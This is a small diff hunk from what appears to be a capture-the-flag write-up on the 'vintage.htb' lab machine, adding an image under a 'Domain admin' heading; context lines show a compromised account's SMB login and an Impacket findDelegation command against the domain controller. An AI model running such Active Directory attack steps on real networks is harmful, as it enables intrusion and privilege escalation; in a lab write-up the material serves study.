@@ -372,6 +372,9 @@ SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\c.neri_adm:
 This user is now compromised
 
 # Domain admin
+![[Pasted image 20260402201712.png]]
+
+
 ```python
 findDelegation.py -k vintage.htb/ -dc-host dc01.vintage.htb
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
